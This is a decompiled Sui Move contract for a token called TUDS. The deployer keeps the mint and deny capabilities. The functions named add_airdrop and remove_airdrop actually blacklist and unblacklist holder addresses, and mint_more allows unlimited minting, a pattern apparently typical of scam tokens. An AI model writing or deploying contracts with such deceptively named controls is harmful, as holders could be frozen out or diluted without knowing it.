module 0xecca850ff56341f0c22984447ef5bec078e5c6865ebaaa50121d23aff40c82ba::TUDS {
    struct TUDS has drop {
        dummy_field: bool,
    }

    public entry fun add_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TUDS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TUDS>(arg0, arg1, arg2, arg3);
    }

    fun init(arg0: TUDS, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TUDS>(arg0, 6, b"TUDS", b"Sui Tuds", b"TUDS FCK", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://pump.mypinata.cloud/ipfs/Qmf7EGpjxrJ98o3x5axtMZs6wxKzPEv6HEACgxXL4Emc1w?img-width=256&img-dpr=2&img-onerror=redirect")), false, arg1);
        let v3 = v0;
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TUDS>>(v2);
        0x2::transfer::public_transfer<0x2::coin::Coin<TUDS>>(0x2::coin::mint<TUDS>(&mut v3, 1000000000000000, arg1), 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::TreasuryCap<TUDS>>(v3, 0x2::tx_context::sender(arg1));
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TUDS>>(v1, 0x2::tx_context::sender(arg1));
    }

    public entry fun mint_more(arg0: &mut 0x2::coin::TreasuryCap<TUDS>, arg1: u64, arg2: &mut 0x2::tx_context::TxContext) {
        0x2::transfer::public_transfer<0x2::coin::Coin<TUDS>>(0x2::coin::mint<TUDS>(arg0, arg1, arg2), 0x2::tx_context::sender(arg2));
    }

    public entry fun remove_airdrop(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TUDS>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TUDS>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

